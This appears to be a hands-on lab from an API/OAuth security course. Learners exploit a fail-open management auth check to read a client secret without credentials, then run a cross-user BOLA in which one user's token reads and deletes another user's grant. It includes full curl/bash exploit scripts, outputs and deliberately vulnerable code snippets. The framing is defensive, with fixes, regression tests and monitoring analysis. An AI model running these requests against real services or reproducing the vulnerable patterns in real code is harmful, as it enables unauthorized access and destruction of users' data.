# Module 11 — Lab

> **What you will do:** retrieve a confidential client's secret with no credentials at all; then run a
> cross-user **BOLA** in which one user reads and then **destroys** another user's grant, using a perfectly
> valid, correctly scoped token; then prove which layer owns each defect and design the fix.

**These are real vulnerabilities in the server you have been running for eleven modules.** They were found
during this module's build and deliberately left unfixed, because finding them yourself is the exercise.

> **Scope discipline.** Everything here runs against *your own* local server. Nothing in this lab is
> transferable to a system you do not operate, and the point is defensive: you are learning to find these in
> code review.

---

## Before you start

```bash
set -a; source docs/curriculum/scripts/curriculum.env; set +a
curl -s -o /dev/null -w "%{http_code}\n" "$API/health"     # expect 200
```

Before running anything, read **`server/src/routes/client.routes.ts`** — all 41 lines — and write down what
you expect `GET /api/client/get/<a client id>` to do without credentials. Then read
**`server/src/middleware/require-basic-auth.ts`**, lines 4–8. Revise your prediction.

---

## Exercise 1 — BFLA: the management API that asks for nothing

**API5:2023 — Broken Function Level Authorization**, enabled by **API8 — Security Misconfiguration**.

No token. No Basic auth. No header of any kind:

```bash
curl -s "$API/client/get/$CLIENT_ID" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('clientName  :', d.get('clientName'))
print('clientType  :', d.get('clientType'))
print('clientSecret:', (d.get('clientSecret') or '')[:8] + '…  <-- REDACTED, but the API returned it in full')
print('redirectUris:', d.get('redirectUris'))"
```

```
clientName  : test
clientType  : CONFIDENTIAL
clientSecret: EXAMPLE-client-secret-REDACTED  <-- the API returned the real one, in full
redirectUris: ['https://<your-host>/']
```

**An unauthenticated caller just read a confidential client's secret in plaintext.** Stop and work out what
that is worth. With that secret and the client ID, an attacker authenticates *as that client* at the token
endpoint — the exact credential that eleven modules of PKCE, PAR and DPoP exist to protect. Every protocol
control in this curriculum is bypassed, not broken.

Keep going:

```bash
# Enumerate any subject's authorized clients
curl -s "$API/client/auth/list/$LAB_USER" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('subject:', d.get('subject'), '| clients:', d.get('totalCount'))
for c in d.get('clients', []): print('   ', c.get('clientId'), '-', c.get('clientName'))"

# List every access token the service has issued
curl -s "$API/token/list" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('total access tokens on this service:', d.get('totalCount'))"
```

```
subject: admin | clients: 2
    <public-client-id>  - Testing App
    <confidential-client-id> - test
total access tokens on this service: 65
```

Now find the cause. It is **not** a missing check:

```bash
grep -n "checkAuth" server/src/controllers/client.management.controller.ts | head -3
sed -n '4,8p' server/src/middleware/require-basic-auth.ts
```

```
7:const checkAuth = requireBasicAuth("client_management");
12:      if (!checkAuth(req, res)) return;
28:      if (!checkAuth(req, res)) return;
```
```js
export function requireBasicAuth(realm: string) {
  return (req: Request, res: Response): boolean => {
    const mgmtClientId = process.env.MGMT_CLIENT_ID;
    const mgmtClientSecret = process.env.MGMT_CLIENT_SECRET;
    if (!mgmtClientId || !mgmtClientSecret) return true;
```

**The check exists, is correctly written, and is wired into every one of the sixteen controllers.** It
returns `true` — *allow* — when its configuration is absent. One unset environment variable disables
authentication across the entire management surface.

Three things to take from this, and the third is the important one:

1. **This is documented.** `AGENTS.md` says: *"`requireBasicAuth` checks `MGMT_CLIENT_ID`/`MGMT_CLIENT_SECRET`;
   if unset, all management routes are unprotected."* So it is a known dev-convenience default, not a hidden
   bug — and your report must say so rather than crying zero-day.
2. **The documentation understates the blast radius.** "Unprotected" and "hands a confidential client's
   secret to anonymous callers" are the same sentence describing very different risks. When you write this
   up, describe the *consequence*, not the mechanism.
3. **Fail-open is the actual defect.** A missing security config should refuse to start, not silently permit
   everything. The failure has no symptom: nothing logs, nothing 500s, the tests pass, and the endpoint looks
   like it is working — because it is.

**Fix it locally now**, then re-run the first command:

```bash
MGMT_CLIENT_ID=admin MGMT_CLIENT_SECRET=secret npm --prefix server run dev   # separate terminal
curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:3000/api/client/get/$CLIENT_ID"   # expect 401
```

---

## Exercise 2 — BOLA: destroying another user's grant

**API1:2023 — Broken Object Level Authorization.** This is the module's headline, and unlike Exercise 1 there
is no missing credential: every request below carries a **valid, correctly scoped, unexpired** access token.

You need two users. Rather than editing anything, run a **second, isolated server instance** with its own
demo users — `AUTH_USERS` is the mechanism `AGENTS.md` documents for exactly this:

```bash
# separate terminal — nothing on :3000 is touched
PORT=3005 AUTH_USERS="alice:alice:alicepw:Alice;bob:bob:bobpw:Bob" npm --prefix server run dev
```

```bash
export API5=http://localhost:3005/api
RUE=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$REDIRECT_URI")

mkgrant() {   # $1=user $2=pass $3=url-encoded scope  → prints the token response
  local J; J=$(mktemp)
  curl -s -c $J -o /dev/null "$API5/authorization?response_type=code&client_id=$CLIENT_ID&redirect_uri=$RUE&scope=$3&state=x&grant_management_action=create"
  local C1; C1=$(curl -s -b $J -c $J "$API5/session/login" | grep -oP 'name="_csrf" value="\K[^"]+' | head -1)
  local L2; L2=$(curl -s -b $J -c $J -o /dev/null -w '%{redirect_url}' -d "username=$1&password=$2&_csrf=$C1" "$API5/session/login")
  local CB
  if echo "$L2" | grep -q consent; then
    local C2; C2=$(curl -s -b $J -c $J "$API5/session/consent" | grep -oP 'name="_csrf" value="\K[^"]+' | head -1)
    CB=$(curl -s -b $J -c $J -o /dev/null -w '%{redirect_url}' -d "decision=approve&_csrf=$C2" "$API5/session/consent")
  else CB="$L2"; fi
  curl -s -u "$CLIENT_ID:$CLIENT_SECRET" \
    -d "grant_type=authorization_code&code=$(echo "$CB" | grep -oP 'code=\K[^&]+')&redirect_uri=$RUE" "$API5/token"
  rm -f $J
}

mkgrant alice alicepw "profile%20grant_management_query%20grant_management_revoke" > /tmp/alice.json
mkgrant bob   bobpw   "address%20grant_management_query%20grant_management_revoke" > /tmp/bob.json

GA=$(python3 -c "import json;print(json.load(open('/tmp/alice.json'))['grant_id'])")
TA=$(python3 -c "import json;print(json.load(open('/tmp/alice.json'))['access_token'])")
GB=$(python3 -c "import json;print(json.load(open('/tmp/bob.json'))['grant_id'])")
TB=$(python3 -c "import json;print(json.load(open('/tmp/bob.json'))['access_token'])")
echo "alice grant ${GA:0:10}…   bob grant ${GB:0:10}…"
```

Note the scopes deliberately differ — Alice's grant covers `profile`, Bob's covers `address`. That makes the
two objects distinguishable, which matters in a moment.

**Predict the next three results before running them.**

```bash
echo "-- CONTROL: alice reads her own grant --"
curl -s -H "Authorization: Bearer $TA" "$API5/gm/$GA" -w '  [%{http_code}]\n' | head -c 90; echo
echo "-- BOLA read: BOB's token, ALICE's grant --"
curl -s -H "Authorization: Bearer $TB" "$API5/gm/$GA" -w '  [%{http_code}]\n' | head -c 90; echo
echo "-- BOLA read: ALICE's token, BOB's grant --"
curl -s -H "Authorization: Bearer $TA" "$API5/gm/$GB" -w '  [%{http_code}]\n'
```

```
-- CONTROL: alice reads her own grant --
{"scopes":[{"scope":"grant_management_query grant_management_revoke profile"}]  [200]
-- BOLA read: BOB's token, ALICE's grant --
{"scopes":[{"scope":"grant_management_query grant_management_revoke profile"}]  [200]
-- BOLA read: ALICE's token, BOB's grant --
{"scopes":[{"scope":"address grant_management_query grant_management_revoke"}],"claims":["address"]}   [200]
```

Look carefully at the third line. Alice asked for Bob's grant and got **Bob's** contents — `address`, not her
own `profile`. So the endpoint **is** resolving the object correctly; it looks up exactly the grant you name.
It simply never asks whether the grant belongs to the caller.

That distinction is the diagnostic. A vaguer test — two grants with identical scopes — would have produced
identical output and left you unable to tell "correctly resolved, not authorized" from "ignoring the ID
entirely". **Design your BOLA tests so the two objects are distinguishable.**

Now the write primitive:

```bash
echo "-- BOLA write: BOB's token DELETEs ALICE's grant --"
curl -s -X DELETE -H "Authorization: Bearer $TB" "$API5/gm/$GA" -w '  [%{http_code}]\n'
echo "-- did alice's grant survive? --"
curl -s -H "Authorization: Bearer $TA" "$API5/gm/$GA" -w '  [%{http_code}]\n'
```

```
-- BOLA write: BOB's token DELETEs ALICE's grant --
  [204]
-- did alice's grant survive? --
{"error":"not_found","error_description":"Grant not found"}   [404]
```

**Bob destroyed Alice's grant.** Not read it — destroyed it. Any user holding a `grant_management_revoke`
token can enumerate grant IDs and revoke every consent on the service. That is a denial-of-service primitive
against every user of every client, delivered through an endpoint where **every OAuth control worked
perfectly.**

Count what did work: the token was signed, unexpired, audience-correct, and carried exactly the scope the
endpoint requires. Scope enforcement is real here — try Bob's `grant_management_query`-only token on a
`DELETE` and you get 401. **The protocol layer is flawless and the outcome is catastrophic.** That sentence
is the entire module.

---

## Exercise 3 — Whose bug is it?

Before writing a finding, establish which layer owns it. Module 06 set this discipline; apply it.

Read what the server sends upstream:

```bash
sed -n '10,26p' server/src/services/grant-management.service.ts
```

```js
  async query(req: Request, grantId: string): Promise<GMResponse> {
    const accessToken = extractBearerToken(req);
    const response = await this.authleteApi.grantManagement.processRequest({
      serviceId,
      gMRequest: { accessToken, gmAction: "QUERY", grantId },
    });
    return response;
  }
```

The server forwards the access token and the grant ID and relays the answer. It performs no ownership check —
but note it also *has* no cheap way to: it would have to introspect the token for a subject and ask Authlete
who owns the grant. So ask the upstream directly:

```bash
set -a; . ./server/.env; set +a          # AUTHLETE_BEARER_TOKEN — never paste it anywhere
curl -s -X POST -H "Authorization: Bearer $AUTHLETE_BEARER_TOKEN" -H 'Content-Type: application/json' \
  -d "{\"accessToken\":\"$TB\",\"gmAction\":\"QUERY\",\"grantId\":\"$GA\"}" \
  "$AUTHLETE_BASE_URL/api/$AUTHLETE_SERVICE_ID/gm" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('action    :', d.get('action'))
print('resultCode:', d.get('resultCode'))"
```

```
action    : OK
resultCode: A277001
```

**The upstream API itself returns `OK`** for Bob's token against Alice's grant. So the repo is relaying a
decision faithfully; the ownership check is not being made anywhere in the chain.

Now be careful about what you conclude, because this is where reports overreach. Search for a setting that
would enable it:

```bash
python3 - <<'PY'
import json,subprocess,os
# service and client config, filtered for anything grant-related
PY
# (or simply: read /service/get and /client/get output and grep for "grant")
```

On this deployment the only grant-related switches are `grantManagementActionRequired`,
`grantManagementEndpoint` and `supportedGrantManagementActions`. **None of them concerns ownership.**

So the honest finding is:

> Cross-subject access to grant objects is possible. The repo's service layer performs no ownership check and
> relays the upstream decision faithfully; a direct call to the upstream `/gm` API reproduces `action: OK` for
> a token belonging to a different subject. No service- or client-level setting governing grant ownership was
> found. **Whether this is an upstream defect or a missing configuration is `UNVERIFIED`** and should be
> raised with the vendor rather than asserted.

Compare that with what you could have written — *"critical vulnerability in Authlete"* — and note the
difference. You verified the behaviour exhaustively and stated the attribution to exactly the confidence your
evidence supports. That is the difference between a report that gets acted on and one that gets argued with.

**What the specification expects is not ambiguous**, and it belongs in the report: Grant Management §5.2 says
*"the respective client must be authorized to use the particular grant id"*, and a grant is defined
throughout as belonging to a client **and a resource owner**.

---

## Exercise 4 — Where does the fix go?

Write the fix for the BOLA, then compare. Think about it as the lesson's four-step argument, not as a patch.

<details>
<summary>My answer</summary>

**Not at the gateway.** A gateway can confirm the token is valid and carries `grant_management_query`. It
cannot know who owns grant `R9ksNHnx…` — that is upstream data.

**At the resource server, as a query constraint, not a check.** In this architecture the server must:

1. Introspect the presented access token to obtain its `sub` (and `client_id`).
2. Resolve the owner of `grantId`.
3. Compare, and return **404** — not 403 — on mismatch.

Step 3's status code matters: with 403 the endpoint becomes an oracle telling an attacker which grant IDs
exist, and grant IDs are the only thing standing between them and the attack.

**Better still, remove the choice.** If the upstream API accepted a *subject* alongside the grant ID and
resolved `(subject, grantId)` as a pair, no caller could construct the unsafe request at all. That is the
"make the insecure version unrepresentable" principle from the lesson, and it is the change I would ask the
vendor for.

**The test I would add**, which is the actual deliverable — a defect without a regression test comes back:

```
create grant as alice → create grant as bob
assert  bob's token GET  alice's grant  → 404
assert  bob's token DEL  alice's grant  → 404
assert  alice's token GET alice's grant → 200        # control: the fix didn't break the feature
```

Note the control assertion. A BOLA "fix" that denies everything passes the first two and is useless.
</details>

---

## Exercise 5 — Would you have noticed?

Authorization defects are silent by design: every request is a 200. Read
[`docs/MONITORING.md`](../../../MONITORING.md) and `server/src/middleware/audit-log.ts`, then answer for
**each** of the following: would this deployment's telemetry reveal it, and what would you add?

1. Bob reads Alice's grant once.
2. An attacker enumerates 10,000 grant IDs in five minutes.
3. An unauthenticated caller reads one client secret.
4. An attacker slowly reads 200 client records over a week.

<details>
<summary>Discussion</summary>

**(1) No, and nothing reasonable would.** One authorized-looking 200 among thousands. Only a rule expressing
"the subject in the token differs from the owner of the object" could see it — and if you could write that
rule, you would enforce it instead of alerting on it. **This is why BOLA must be prevented, not detected.**

**(2) Yes, if you are looking.** `generalLimiter` (60/min) throttles it, and the Prometheus counter
`http_requests_total{route="/api/gm/:grantId", status="404"}` would spike. Note the label is the **route
template**, not the URL — good for cardinality, and it means the metric shows the enumeration even though
every ID is distinct. Alert on 404-rate-per-route, not on absolute counts.

**(3) Barely.** The audit log records path, IP, user-agent, and `clientId` from Basic auth — which is absent
here, so the entry looks like ordinary traffic. A 200 on `/api/client/get/:clientId` is indistinguishable
from a legitimate admin action. **The absence of an authenticated principal in a log entry for an admin route
is itself the signal**, and nothing currently alerts on it.

**(4) No.** Under every rate limit, spread across a week, all 200s. This is API6 in miniature: each request
is individually legitimate and the aggregate is the breach. Catching it needs per-principal baselining, which
this deployment has no notion of — because it has no notion of a principal on those routes at all.

**The pattern:** telemetry catches *volume*, not *authorization*. Anything patient and low-rate is invisible.
Prevention is the control; monitoring is the backstop, and a weak one for exactly this class.
</details>

---

## Exercise 6 — Find the BOLA in code review

Real code-review practice. Each snippet has at least one defect from this module. Name it, classify it
(API1/API3/API5), and fix it.

```js
// A
router.get('/api/invoices/:id', requireScope('invoices:read'), async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  res.json(invoice);
});
```

```js
// B
router.patch('/api/users/:id', requireAuth, async (req, res) => {
  if (req.params.id !== req.user.sub) return res.sendStatus(403);
  const user = await db.users.update(req.params.id, req.body);
  res.json(user);
});
```

```js
// C
router.get('/api/reports/:id', requireAuth, async (req, res) => {
  const report = await db.reports.findOne({
    id: req.params.id,
    tenantId: req.headers['x-tenant-id'],
  });
  if (!report) return res.sendStatus(404);
  res.json(report);
});
```

<details>
<summary>Answers</summary>

**A — BOLA (API1).** The scope check gates the endpoint and nothing gates the row: any authenticated caller
with `invoices:read` reads any invoice. Fix:
`db.invoices.findOne({ id: req.params.id, ownerId: req.user.sub })` → 404 if absent. Also note it returns the
whole record, so it is a latent **BOPLA** too — send an explicit projection.

**B — BOPLA (API3), via mass assignment.** The BOLA is correctly handled (the `sub` comparison is right, if
403 rather than 404). But `req.body` goes straight into the update, so the user sets `role`, `is_admin`, or
`emailVerified` on **their own** record — self-privilege-escalation needs no BOLA. Fix: an explicit allow-list
of updatable fields.

**C — BOLA (API1) via a caller-controlled tenant.** The query *looks* right — it is scoped — but `tenantId`
comes from a **request header the caller sets**. Change `X-Tenant-Id` and read any tenant's reports. This is
the most dangerous snippet of the three, because it pattern-matches as the secure version and would pass most
reviews. Fix: take the tenant from the validated token's claims, never from the request. Worth noting the
gateway cannot save you here either — if the gateway sets the header, it must also *strip* any inbound copy,
and header-stripping bugs are common.
</details>

---

## Break it — two to reason about

1. **Your company adds an API gateway that validates tokens and enforces scope per route, and announces that
   "authorization is now centralised."** Write the two-paragraph reply you would send. Say what the gateway
   genuinely fixed, what it cannot fix, and what new risk the *announcement itself* creates.

2. **A team proposes fixing BOLA by encoding every object the user may access into the access token at
   issuance.** Give three reasons this fails, and name the one situation where a bounded version of it is
   actually the right answer.

---

## Verification block

- [ ] Read a **confidential client's secret** with no credentials, and can state what it is worth
- [ ] Enumerated a subject's authorized clients and counted the service's access tokens unauthenticated
- [ ] Located `require-basic-auth.ts:8` and can explain why **fail-open** is the defect
- [ ] Confirmed the fix: with `MGMT_*` set, the same request returns **401**
- [ ] Ran a cross-user BOLA **read** — and used *differently scoped* grants to prove the object resolves
- [ ] Ran a cross-user BOLA **write** — one user destroyed another's grant (204, then 404)
- [ ] Established the upstream returns `action: OK`, and wrote the attribution as **UNVERIFIED**
- [ ] Wrote the fix *and* its regression test, including the control assertion
- [ ] Answered which of the four attacks the telemetry would catch (and why two of them cannot be)
- [ ] Classified all three review snippets, including why **C** is the dangerous one

---

## Clean up

```bash
# stop the :3005 instance (Ctrl-C in its terminal), then:
rm -f /tmp/alice.json /tmp/bob.json
```

The grants live on your Authlete service; revoke any that survive with
`DELETE $API/gm/<grant_id>` using a `grant_management_revoke` token. Bob's, ironically, can revoke all of
them.

---

## What to carry into the capstone

1. **The protocol layer can be flawless and the outcome catastrophic.** Exercise 2's every request was
   perfectly authenticated. Design reviews that stop at the token stop before the vulnerability.
2. **Fail-open is a design decision, and almost always the wrong one.** Exercise 1 was one `return true`.
3. **State attributions to the confidence your evidence supports.** "The upstream returns OK; whether that is
   a defect or a missing setting is unverified" is a stronger sentence than a confident accusation.
4. **Make the insecure version unrepresentable.** Owner-scoped queries beat ownership checks, for the same
   reason FAPI 2.0 chose PKCE over `c_hash`.

**[→ Module 12 — Capstone](../12-capstone/README.md)** is next: design a high-assurance multi-tenant
authorization architecture and defend it, then find the flaws in a deliberately vulnerable variant. You now
have every tool the curriculum offers — and, more usefully, the habit of asking what each one does *not* do.
